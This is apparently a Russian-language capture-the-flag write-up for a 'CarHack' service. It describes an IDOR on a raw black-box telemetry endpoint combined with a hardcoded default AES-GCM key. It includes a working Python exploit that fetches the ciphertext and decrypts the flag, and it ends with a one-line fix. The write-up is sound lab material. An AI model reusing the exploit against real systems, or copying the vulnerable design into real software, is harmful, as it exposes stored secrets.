# IDOR с шифротекстом

## как найти

`глазами`

```bash
    @app.get("/api/blackbox/raw/{record_id}")
    async def blackbox_raw(record_id: str) -> dict[str, str]:
        ciphertext = await runtime.telemetry.get_blackbox_raw(record_id)
        if ciphertext is None:
            raise _json_error(404, "record not found")
        return {"ct_b64": ciphertext}
```

тут мы видим IDORа

## description

этот идорчик дает шифротекст, который шифруется и кладется так:
```python

_BLACKBOX_AAD = b"carhack:blackbox:v1"
DEFAULT_TELE_KEY = b"CarHack-telemetry-aes-key-v1-32b"
cipher = AESGCM(DEFAULT_TELE_KEY)

async def store_blackbox(self, flag: str, owner: str) -> str:

    if not isinstance(flag, str) or not flag:
        raise TelemetryError("black-box flag must be a non-empty string")
    if not isinstance(owner, str) or not owner:
        raise TelemetryError("black-box owner is required")

    nonce = secrets.token_bytes(12)
    ciphertext = cipher.encrypt(nonce, flag.encode("utf-8"), _BLACKBOX_AAD)
    record_id = secrets.token_urlsafe(18)
    async with self._lock:
        self._records.prune("blackbox")
        self._records.put("blackbox", record_id, owner, nonce + ciphertext)
    await self._log("stored encrypted black-box record")
    return record_id

async def get_blackbox(self, record_id: str, owner: str) -> str | None:

    async with self._lock:
        record = self._records.get("blackbox", record_id)
    if record is None or not hmac.compare_digest(record.owner, owner):
        return None
    try:
        plaintext = cipher.decrypt(record.data[:12], record.data[12:], _BLACKBOX_AAD)
        return plaintext.decode("utf-8")
    except Exception as exc:
        raise TelemetryError("black-box record cannot be decrypted") from exc

```

## PoC

проще сразу солв

### sploit

```python
from base64 import b64decode
import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


attack_data = ""

_BLACKBOX_AAD = b"carhack:blackbox:v1"

DEFAULT_TELE_KEY = b"CarHack-telemetry-aes-key-v1-32b"

cipher = AESGCM(DEFAULT_TELE_KEY)
record = b64decode(requests.get(f"http://localhost:8080/api/blackbox/raw/{attack_data}").json().get("ct_b64"))

plaintext = cipher.decrypt(record[:12], record[12:], _BLACKBOX_AAD)
print(plaintext)
```

### fix

просто заменить дефолтный ключ

